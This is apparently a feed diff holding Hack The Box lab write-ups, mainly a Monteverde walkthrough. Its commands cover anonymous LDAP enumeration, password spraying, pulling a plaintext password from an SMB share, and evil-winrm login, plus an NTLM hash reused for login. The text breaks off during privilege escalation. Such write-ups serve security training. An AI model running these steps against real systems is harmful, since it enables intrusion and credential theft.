+<span class="hljs-title">Administrator</span>:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">3</span>dc553ce4b9fd20bd016e098d2d2fd2e:::
+&lt;snip&gt;</code></pre></div>
+<p>Now we can login with admins hash <code>3dc553ce4b9fd20bd016e098d2d2fd2e</code>.</p>
+<p><img src="/_resources/2dd88d3b9b9c4317bf8aeb52b3b94a8f.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Windows - Medium - Monteverde]]></title>
+            <guid>9ea67613cb0e4bcd986161591a2f980d</guid>
+            <pubDate>Mon, 11 Aug 2025 08:39:47 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Nmap scan reveals domain controller for megabank.local, dns, ldap and smb.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ nmap <span class="hljs-operator">-</span>p<span class="hljs-operator">-</span> <span class="hljs-operator">-</span>A <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>
+PORT      STATE SERVICE       VERSION
+<span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  domain        Simple DNS Plus
+<span class="hljs-number">88</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  kerberos<span class="hljs-operator">-</span>sec  Microsoft Windows Kerberos (server <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">28</span>Z)
+<span class="hljs-number">135</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">139</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  netbios<span class="hljs-operator">-</span>ssn   Microsoft Windows netbios<span class="hljs-operator">-</span>ssn
+<span class="hljs-number">389</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  microsoft<span class="hljs-operator">-</span>ds?
+<span class="hljs-number">464</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  kpasswd5?
+<span class="hljs-number">593</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">3268</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">3269</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">5985</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-number">9389</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  mc<span class="hljs-operator">-</span>nmf        .NET Message Framing
+<span class="hljs-number">49667</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49673</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">49674</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49676</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49693</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49746</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+
+Host script results:
+<span class="hljs-operator">|</span> smb2<span class="hljs-operator">-</span><span class="hljs-type">time</span>: 
+<span class="hljs-operator">|</span>   <span class="hljs-type">date</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span>T08:<span class="hljs-number">37</span>:<span class="hljs-number">25</span>
+<span class="hljs-operator">|</span>_  start_date: N<span class="hljs-operator">/</span>A
+<span class="hljs-operator">|</span> smb2<span class="hljs-operator">-</span>security<span class="hljs-operator">-</span>mode: 
+<span class="hljs-operator">|</span>   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: 
+<span class="hljs-operator">|</span>_    Message signing enabled <span class="hljs-keyword">and</span> required</code></pre></div>
+<p>We can check if we can further enumerate the domain.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python windapsearch<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">""</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+<span class="hljs-selector-attr">[+]</span> No username provided. Will try anonymous bind.
+<span class="hljs-selector-attr">[+]</span> Using Domain Controller at: <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+<span class="hljs-selector-attr">[+]</span> Getting defaultNamingContext from Root DSE
+<span class="hljs-selector-attr">[+]</span>	Found: DC=MEGABANK,DC=LOCAL
+<span class="hljs-selector-attr">[+]</span> Attempting bind
+<span class="hljs-selector-attr">[+]</span>	...success! Binded as: 
+<span class="hljs-selector-attr">[+]</span>	 None
+
+<span class="hljs-selector-attr">[*]</span> Bye!</code></pre></div>
+<p>And then enumerate the users.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ python windapsearch.py -u <span class="hljs-string">""</span> --dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span> -U --admin-objects
+[+] No username provided. Will <span class="hljs-keyword">try</span> anonymous bind.
+[+] <span class="hljs-keyword">Using</span> Domain Controller at: <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+[+] Getting defaultNamingContext <span class="hljs-keyword">from</span> Root DSE
+[+]	Found: DC=MEGABANK,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded <span class="hljs-keyword">as</span>: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found <span class="hljs-number">10</span> users: 
+
+<span class="hljs-symbol">cn:</span> Guest
+
+<span class="hljs-symbol">cn:</span> AAD_987d7f2f57d2
+
+<span class="hljs-symbol">cn:</span> Mike Hope
+<span class="hljs-symbol">userPrincipalName:</span> mhope@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> SABatchJobs
+<span class="hljs-symbol">userPrincipalName:</span> SABatchJobs@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-ata
+<span class="hljs-symbol">userPrincipalName:</span> svc-ata@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-bexec
+<span class="hljs-symbol">userPrincipalName:</span> svc-bexec@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-netapp
+<span class="hljs-symbol">userPrincipalName:</span> svc-netapp@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Dimitris Galanos
+<span class="hljs-symbol">userPrincipalName:</span> dgalanos@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Ray O<span class="hljs-comment">'Leary</span>
+<span class="hljs-symbol">userPrincipalName:</span> roleary@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Sally Morgan
+<span class="hljs-symbol">userPrincipalName:</span> smorgan@MEGABANK.LOCAL
+
+[+] Attempting <span class="hljs-keyword">to</span> enumerate all admin (<span class="hljs-keyword">protected</span>) objects
+[+]	Found <span class="hljs-number">0</span> Admin Objects:
+
+
+[*] Bye!</code></pre></div>
+<p>There are two interesting accoutn names: <code>AAD_987d7f2f57d2</code> and <code>SABatchJobs@MEGABANK.LOCAL</code>. AAD indicates that Azure Active Directory is installed, so presumeably there is also Remote Managment.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ python windapsearch.py -u <span class="hljs-string">""</span> --dc-ip 10.129.228.111 -U -m <span class="hljs-string">"Remote Management Users"</span>
+[+] <span class="hljs-literal">No</span> username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 10.129.228.111
+[+] Getting defaultNamingContext <span class="hljs-keyword">from</span> Root DSE
+[+]	Found: <span class="hljs-attribute">DC</span>=MEGABANK,DC=LOCAL
+&lt;snip&gt;
+[+] Attempting <span class="hljs-keyword">to</span> enumerate full DN <span class="hljs-keyword">for</span> group: Remote Management<span class="hljs-built_in"> Users
+</span>[+]	 Using DN: <span class="hljs-attribute">CN</span>=Remote Management Users,<span class="hljs-attribute">CN</span>=Builtin,DC=MEGABANK,DC=LOCAL
+
+[+]	 Found 1 members:
+
+b<span class="hljs-string">'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL'</span></code></pre></div>
+<p>We can check if we can list shares.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ smbclient -N -L \\\\<span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>\\
+Anonymous <span class="hljs-keyword">login</span> successful
+
+    Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span>
+    <span class="hljs-comment">---------       ----      -------</span>
+Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.
+do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span></code></pre></div>
+<p>We can do further enumeration with <code>enum4linux -A &lt;ip&gt;</code> and check that there is no lockout policy.</p>
+<div><pre class="hljs"><code><span class="hljs-attr">Domain password information:</span>
+  <span class="hljs-attr">Password history length:</span> <span class="hljs-number">24</span>
+  <span class="hljs-attr">Minimum password length:</span> <span class="hljs-number">7</span>
+  <span class="hljs-attr">Maximum password age:</span> <span class="hljs-number">41</span> <span class="hljs-string">days</span> <span class="hljs-number">23</span> <span class="hljs-string">hours</span> <span class="hljs-number">53</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Password properties:</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_COMPLEX:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_NO_ANON_CHANGE:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_NO_CLEAR_CHANGE:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_LOCKOUT_ADMINS:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE:</span> <span class="hljs-literal">false</span>
+<span class="hljs-attr">Domain lockout information:</span>
+  <span class="hljs-attr">Lockout observation window:</span> <span class="hljs-number">30</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Lockout duration:</span> <span class="hljs-number">30</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Lockout threshold:</span> <span class="hljs-string">None</span>
+<span class="hljs-attr">Domain logoff information:</span>
+  <span class="hljs-attr">Force logoff time:</span> <span class="hljs-string">not</span> <span class="hljs-string">set</span></code></pre></div>
+<h1 id="foothold">Foothold</h1>
+<p>To start spraying, we can get all the users into a file. Then, we can check if anyone uses their username as their password.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ crackmapexec smb <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span> -d megabank -u /tmp/users<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> /tmp/users<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> First <span class="hljs-selector-tag">time</span> use detected
+<span class="hljs-selector-attr">[*]</span> Creating home directory structure
+&lt;snip&gt;
+<span class="hljs-selector-attr">[*]</span> Initializing RDP protocol database
+<span class="hljs-selector-attr">[*]</span> Copying default configuration file
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>  <span class="hljs-number">445</span>    MONTEVERDE       <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+&lt;snip&gt;
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>  <span class="hljs-number">445</span>    MONTEVERDE       <span class="hljs-selector-attr">[+]</span> megabank\SABatchJobs:SABatchJobs </code></pre></div>
+<p>We can check if we can execute commands on server. We cant.</p>
+<p><code>smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.129.228.111 -x whoami</code></p>
+<p>We can then check for any interesting files.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ smbmap -u SABatchJobs -p SABatchJobs -d megabank -H <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span> -A <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> -R
+[+] IP: <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>:<span class="hljs-number">445</span>	<span class="hljs-type">Name</span>: <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>                                    
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> azure_uploads.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> IPC$.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> NETLOGON.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> SYSVOL.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> users$.
+[+] Match <span class="hljs-built_in">found</span>! Downloading: users$\mhope\azure.xml</code></pre></div>
+<div><pre class="hljs"><code>└──╼ [★]$ cat 10.129.228.111-users_mhope_azure.xml
+��<span class="hljs-tag">&lt;<span class="hljs-name">Objs</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">"1.1.0.1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://schemas.microsoft.com/powershell/2004/04"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">"0"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">TN</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">"0"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Object<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">TN</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">ToString</span>&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="hljs-tag">&lt;/<span class="hljs-name">ToString</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Props</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">DT</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"StartDate"</span>&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class="hljs-tag">&lt;/<span class="hljs-name">DT</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">DT</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"EndDate"</span>&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class="hljs-tag">&lt;/<span class="hljs-name">DT</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">G</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"KeyId"</span>&gt;</span>00000000-0000-0000-0000-000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">G</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">S</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"Password"</span>&gt;</span>4n0therD4y@n0th3r$<span class="hljs-tag">&lt;/<span class="hljs-name">S</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">Props</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Objs</span>&gt;</span></code></pre></div>
+<p>We can then check if mhope uses it, as he has remote access. <code>evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'</code>. It works!</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>First we can check what is installed on the server.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cd <span class="hljs-string">"C:\Program Files"</span>
+*Evil-WinRM* PS C:\Program Files&gt; ls
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">36</span> PM                Common Files
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                internet explorer
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">38</span> PM                Microsoft Analysis Services
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">51</span> PM                Microsoft Azure Active Directory Connect
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">37</span> PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">02</span> PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">53</span> PM                Microsoft Azure AD Sync
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">38</span> PM                Microsoft SQL Server
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">25</span> PM                Microsoft Visual Studio <span class="hljs-number">10.0</span>
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">32</span> PM                Microsoft.NET
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">28</span> AM                PackageManagement
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">37</span> PM                VMware
+d-r---         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Defender
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Defender Advanced Threat Protection
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Mail
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Media Player
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Multimedia Platform
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">28</span> AM                windows nt
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Photo Viewer
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Portable Devices
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Security
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">28</span> AM                WindowsPowerShell</code></pre></div>
+<p>Further enumeration tools have restricted access.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Program Files&gt; wmic.exe service get name
+WMIC.exe : <span class="hljs-type">ERROR</span>:
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (ERROR::String) [], RemoteException
+    + FullyQualifiedErrorId : <span class="hljs-type">NativeCommandError</span>
+
+Description = <span class="hljs-keyword">Access</span> denied
+*Evil-WinRM* PS C:\Program Files&gt; sc.exe query state= <span class="hljs-keyword">all</span> 
+[SC] OpenSCManager FAILED <span class="hljs-number">5</span>:
+
+<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.
+
+*Evil-WinRM* PS C:\Program Files&gt; net.exe start
+net.exe : <span class="hljs-type">System</span> error <span class="hljs-number">5</span> has occurred.
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (System error <span class="hljs-number">5</span> has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : <span class="hljs-type">NativeCommandError</span>
+
+<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.</code></pre></div>
+<p>We can though continue enumeration of ADSync, which is used by AAD, and find its version.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Program Files&gt; <span class="hljs-keyword">Get</span>-Item -<span class="hljs-type">Path</span> HKLM:\<span class="hljs-keyword">SYSTEM</span>\CurrentControlSet\Services\ADSync
+
+
+    Hive: HKEY_LOCAL_MACHINE\<span class="hljs-keyword">SYSTEM</span>\CurrentControlSet\Services
+
+
+<span class="hljs-type">Name</span>                           Property
+<span class="hljs-comment">----                           --------</span>
+ADSync                         <span class="hljs-keyword">Type</span>             : <span class="hljs-number">16</span>
+                               <span class="hljs-keyword">Start</span>            : <span class="hljs-number">2</span>
+                               ErrorControl     : <span class="hljs-number">1</span>
+                               ImagePath        : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"
+                               DisplayName      : Microsoft Azure AD Sync
+                               DependOnService  : {winmgmt}
+                               ObjectName       : MEGABANK\AAD_987d7f2f57d2
+                               Description      : Enables integration <span class="hljs-keyword">and</span> management <span class="hljs-keyword">of</span> <span class="hljs-keyword">identity</span> information across multiple directories, systems <span class="hljs-keyword">and</span> platforms. <span class="hljs-keyword">If</span> this service <span class="hljs-keyword">is</span> stopped <span class="hljs-keyword">or</span> disabled, <span class="hljs-keyword">no</span> synchronization <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> management <span class="hljs-keyword">for</span>
+                               objects <span class="hljs-keyword">in</span> connected data
+                                                  sources will be performed.
+                               FailureActions   : {<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.</span>..}
+                               DelayedAutostart : <span class="hljs-number">1</span></code></pre></div>
+<p>We can then get version of the binary.</p>
+<div><pre class="hljs"><code><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ItemProperty</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-string">"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Format</span><span class="hljs-operator">-</span><span class="hljs-variable">list</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Property</span> <span class="hljs-operator">*</span> <span class="hljs-operator">-</span><span class="hljs-variable">Force</span>
+
+
+<span class="hljs-variable">PSPath</span>            <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span><span class="hljs-string">::C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>\<span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+<span class="hljs-variable">PSParentPath</span>      <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span><span class="hljs-string">::C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>
+<span class="hljs-variable">PSChildName</span>       <span class="hljs-operator">:</span> <span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+<span class="hljs-variable">PSDrive</span>           <span class="hljs-operator">:</span> <span class="hljs-built_in">C</span>
+<span class="hljs-variable">PSProvider</span>        <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span>
+<span class="hljs-built_in">Mode</span>              <span class="hljs-operator">:</span> <span class="hljs-operator">-</span><span class="hljs-variable">a</span><span class="hljs-operator">----</span>
